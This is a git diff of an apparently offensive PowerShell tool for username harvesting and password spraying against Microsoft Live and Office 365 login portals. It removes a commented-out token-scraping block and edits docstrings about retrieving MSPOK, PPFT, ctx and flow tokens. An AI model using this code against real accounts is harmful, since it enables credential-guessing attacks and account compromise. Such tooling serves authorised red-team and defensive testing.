@@ -3950,32 +3950,6 @@ function Invoke-UsernameHarvestMicrosoftLive {
     $FlowToken = $tokens.FlowToken
     Write-Verbose "Retrieved MSPOK Cookie: $MSPOK"
     Write-Verbose "Retrieved flowToken: $FlowToken"
-
-    # # Get the MSPOK and PPFT tokens
-    # $request = [System.Net.WebRequest]::Create("https://login.live.com/login.srf")
-    # $response = $request.GetResponse()
-    # $cookieString = $response.GetResponseHeader("Set-Cookie")
-    # $mspokIndex = $cookieString.IndexOf("MSPOK")
-    # $semiColonIndex = $cookieString.IndexOf(";", $mspokIndex)
-    # $MSPOK = $cookieString.Substring($mspokIndex, $semiColonIndex-$mspokIndex).Split("=")[1]
-    # Write-Verbose "Retrieved MSPOK Cookie: $MSPOK"
-    # # PPFT/flowToken Index retrieval
-    # $stream = $response.GetResponseStream()
-    # $streamReader = New-Object System.IO.StreamReader $stream
-    # $htmlResp = $streamReader.ReadToEnd()
-    # $ppftIndex = $htmlResp.IndexOf("name=`"PPFT`"")
-    # $endInputIndex = $htmlResp.IndexOf("/>", $ppftIndex)
-    # $valueIndex = $htmlResp.IndexOf("value=`"", $ppftIndex)
-    # if ($valueIndex -gt $endInputIndex)
-    # {
-    #     Write-Error "Could not retrieve value of PPFT token. This indicates that the HTML structure of the document has changed. Open an issue report on Github!"
-    # }
-    # else
-    # {
-    #     $firstQuote = $valueIndex + 7
-    #     $endValue = $htmlResp.IndexOf("`"", $firstQuote)
-    #     $flowToken = $htmlResp.Substring($firstQuote, $endValue - $firstQuote)
-    #     Write-Verbose "Retrieved PPFT/flowToken: $flowToken"
     $baseRequest = [System.Net.WebRequest]::Create("https://login.live.com/GetCredentialType.srf")
     $baseRequest.Headers.Add("Cookie", "MSPOK=$MSPOK;")
     $baseRequest.Headers.Add("Content-type", "application/json; charset=UTF-8")
@@ -4124,7 +4098,6 @@ function Invoke-PasswordSprayMicrosoftLive {
             $Emails = $EmailAddress
         }
         $tokens = Read-MsftLiveLoginTokens
-        # Write-Host -ForegroundColor "yellow" "[*] Now spraying MicrosoftLive Portal at https://login.live.com"
         # Rewrite of the Gmail Spray threading block
         $EmailCount = $Emails.Count
         $PasswordCount = $Passwords.Count
@@ -4244,8 +4217,8 @@ function Read-MsftLiveLoginTokens {
     error is thrown. Otherwise, return a PSObject like:
 
     {
-        MSPOK: "SomeCookie";
-        FlowToken: "SomeGreatToken";
+        MSPOK: "$MSPOK";
+        FlowToken: "$FlowToken";
     }
 
     Function: Read-MsftLiveLoginTokens
@@ -4506,14 +4479,14 @@ function Read-MsftOfficeLoginTokens {
   and password spraying.
 
   .DESCRIPTION
-  This module retrieves the MSPOK cookie and PPFT flow token from
-  the login.live.com page. These two items are responsible for a
-  genuine login attempt. If these values cannot be retrieved, an
-  error is thrown. Otherwise, return a PSObject like:
+  This module retrieves the nonce, flowToken and ctx tokens from
+  the login.microsoftonline.com page. These items are necessary
+  for login attempts. A PSObject is returned of the form:
 
   {
-      MSPOK: "SomeCookie";
-      FlowToken: "SomeGreatToken";
+      Referer: "$Uri";
+      Ctx: "$Ctx";
+      FlowToken: "$FlowToken";
   }
 
   Function: Read-MsftLoginTokens
